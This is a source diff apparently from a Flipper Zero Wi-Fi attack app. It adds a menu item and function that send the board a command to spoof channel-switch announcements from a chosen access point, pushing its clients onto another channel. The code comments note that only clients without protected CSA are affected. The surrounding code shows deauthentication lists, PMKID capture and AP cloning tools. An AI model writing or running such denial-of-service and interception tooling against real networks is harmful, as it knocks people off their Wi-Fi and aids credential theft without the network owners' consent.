@@ -337,6 +337,7 @@ typedef enum {
 #define TOOL_PKCLIENT 13
 #define TOOL_PROBE   14
 #define TOOL_IDS     15
+#define TOOL_CSA     16
 
 // Deferred GUI events posted from the UART worker thread (GUI must run on the GUI thread).
 #define DELFY_EVT_RECON 0x2000
@@ -1294,6 +1295,25 @@ static bool delfy_has_cap(delfyRTL* app, char cap) {    if(app->fw_caps[0] == '\
 }
 
 // C: append the selected AP to the board's multi-target deauth list.
+// B2: spoof channel-switch announcements from the selected AP so its clients hop away with no
+// deauth at all. Only clients without protected CSA (i.e. not PMF/WPA3-required) obey it.
+static void delfy_csa(delfyRTL* app) {
+    int ch;
+    char hex[13];
+    delfy_sel_ap(app, &ch, hex);
+    if(hex[0] == '\0') {
+        snprintf(popupHeader, sizeof(popupHeader), "CSA");
+        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
+        scene_manager_next_scene(app->scene_manager, popupScene);
+        return;
+    }
+    int newch = (ch <= 6) ? 11 : 1;   // move them as far across 2.4 GHz as the band allows
+    char cmd[64];
+    snprintf(cmd, sizeof(cmd), "CSA %s %d %d 12\n", hex, ch, newch);
+    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
+    { char b[48]; snprintf(b, sizeof(b), "ch %d -> %d", ch, newch); delfy_busy(app, "CSA", b); }
+}
+
 static void delfy_deauth_add(delfyRTL* app) {
     int ch;
     char hex[13];
@@ -1881,6 +1901,7 @@ static void tools_item_callback(void* context, uint32_t index) {
     case TOOL_STA: delfy_start_sta(app); break;
     case TOOL_PROBE: delfy_start_probe(app); break;
     case TOOL_IDS: delfy_start_ids(app); break;
+    case TOOL_CSA: delfy_csa(app); break;
     case TOOL_PMKID: delfy_start_pmkid(app, false); break;
     case TOOL_PKGRAB: delfy_start_pmkid(app, true); break;
     case TOOL_PKCLIENT: delfy_start_pmkid_clientless(app); break;
@@ -1925,6 +1946,7 @@ void tools_menu_scene_on_enter(void* context) {
         submenu_add_item(app->submenu, "Deauth list: RUN", TOOL_DARUN, tools_item_callback, app);
         submenu_add_item(app->submenu, "Deauth list: STOP", TOOL_DASTOP, tools_item_callback, app);
         submenu_add_item(app->submenu, "Deauth IDS", TOOL_IDS, tools_item_callback, app);
+        submenu_add_item(app->submenu, "CSA attack (this AP)", TOOL_CSA, tools_item_callback, app);
     }
     submenu_add_item(app->submenu, "Channel hop on/off", TOOL_HOP, tools_item_callback, app);
     submenu_add_item(app->submenu, "Stop / clear", TOOL_STOP, tools_item_callback, app);
@@ -3916,6 +3938,11 @@ void uart_process_line(FuriString* line, void* context) {
         view_dispatcher_send_custom_event(app->view_dispatcher, DELFY_EVT_RECON);
     } else if(strncmp(furi_string_get_cstr(line), "PROBE:", 6) == 0) {
         recon_append(furi_string_get_cstr(line) + 6);
+    } else if(strncmp(furi_string_get_cstr(line), "CSA:", 4) == 0) {
+        // B2: what the board actually sent
+        snprintf(popupHeader, sizeof(popupHeader), "CSA");
+        snprintf(message, sizeof(message), "Sent %s", furi_string_get_cstr(line) + 4);
+        view_dispatcher_send_custom_event(app->view_dispatcher, DELFY_EVT_POPUP);
     } else if(strncmp(furi_string_get_cstr(line), "APCLONE:", 8) == 0) {
         snprintf(message, sizeof(message), "Cloned %s", furi_string_get_cstr(line) + 8);
         snprintf(popupHeader, sizeof(popupHeader), "AP clone");
